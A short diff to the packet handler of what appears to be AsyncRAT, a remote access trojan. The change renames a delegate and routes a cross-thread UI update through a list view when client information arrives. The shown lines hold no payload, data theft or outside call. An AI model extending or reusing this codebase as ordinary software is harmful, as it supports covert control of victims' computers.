@@ -7,7 +7,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
 {
     class HandlePacket
     {
-        public delegate void UpdateListViewDelegatevoid(Clients Client, byte[] Data);
+        public delegate void UpdateForm1Delegatevoid(Clients client, byte[] data);
         public static void Read(Clients client, byte[] data)
         {
             MsgPack unpack_msgpack = new MsgPack();
@@ -15,9 +15,9 @@ namespace AsyncRAT_Sharp.Handle_Packet
             switch (unpack_msgpack.ForcePathObject("Packet").AsString)
             {
                 case "ClientInfo":
-                    if (Program.form1.InvokeRequired)
+                    if (Program.form1.listView1.InvokeRequired)
                     {
-                        Program.form1.Invoke(new UpdateListViewDelegatevoid(Read), new object[] { client, data });
+                        Program.form1.listView1.Invoke(new UpdateForm1Delegatevoid(Read), new object[] { client, data });
                     }
                     else
                     {
